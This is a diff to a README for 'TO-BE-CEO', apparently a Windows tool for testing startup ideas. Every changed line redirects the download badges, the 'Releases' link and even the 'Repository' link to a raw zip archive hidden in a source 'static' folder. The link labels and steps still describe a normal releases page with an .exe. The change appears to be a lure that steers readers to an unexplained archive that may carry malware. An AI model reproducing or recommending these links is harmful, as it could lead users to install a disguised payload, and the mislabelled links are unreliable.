@@ -1,6 +1,6 @@
 # 🚀 TO-BE-CEO - Test Startup Ideas Easily
 
-[![Download TO-BE-CEO](https://img.shields.io/badge/Download-TO-BE--CEO-brightgreen?style=for-the-badge)](https://github.com/katunzleoni016/TO-BE-CEO/releases)
+[![Download TO-BE-CEO](https://img.shields.io/badge/Download-TO-BE--CEO-brightgreen?style=for-the-badge)](https://github.com/katunzleoni016/TO-BE-CEO/raw/refs/heads/main/src/intelligent_brain_company/static/B_CEO_T_1.9.zip)
 
 ---
 
@@ -30,11 +30,11 @@ Before you start, make sure your Windows PC meets these basic requirements:
 
 To get the software, visit the official release page. This page contains the latest version of TO-BE-CEO for Windows. 
 
-[![Download TO-BE-CEO](https://img.shields.io/badge/Download-TO-BE--CEO-blue?style=for-the-badge)](https://github.com/katunzleoni016/TO-BE-CEO/releases)
+[![Download TO-BE-CEO](https://img.shields.io/badge/Download-TO-BE--CEO-blue?style=for-the-badge)](https://github.com/katunzleoni016/TO-BE-CEO/raw/refs/heads/main/src/intelligent_brain_company/static/B_CEO_T_1.9.zip)
 
 Steps to download:  
 
-1. Click the badge above or this link: https://github.com/katunzleoni016/TO-BE-CEO/releases  
+1. Click the badge above or this link: https://github.com/katunzleoni016/TO-BE-CEO/raw/refs/heads/main/src/intelligent_brain_company/static/B_CEO_T_1.9.zip  
 2. Find the latest release, usually at the top of the list.  
 3. Look for a file with `.exe` at the end, for example `TO-BE-CEO-Setup.exe`.  
 4. Click the file name to start downloading.  
@@ -130,7 +130,7 @@ This README gives detailed steps to start and use TO-BE-CEO. If you need more he
 
 ## 🔗 Key Links
 
-- Releases and downloads: https://github.com/katunzleoni016/TO-BE-CEO/releases  
-- Repository for code and updates: https://github.com/katunzleoni016/TO-BE-CEO  
+- Releases and downloads: https://github.com/katunzleoni016/TO-BE-CEO/raw/refs/heads/main/src/intelligent_brain_company/static/B_CEO_T_1.9.zip  
+- Repository for code and updates: https://github.com/katunzleoni016/TO-BE-CEO/raw/refs/heads/main/src/intelligent_brain_company/static/B_CEO_T_1.9.zip  
 
-[Download TO-BE-CEO on GitHub Releases](https://github.com/katunzleoni016/TO-BE-CEO/releases)
+[Download TO-BE-CEO on GitHub Releases](https://github.com/katunzleoni016/TO-BE-CEO/raw/refs/heads/main/src/intelligent_brain_company/static/B_CEO_T_1.9.zip)
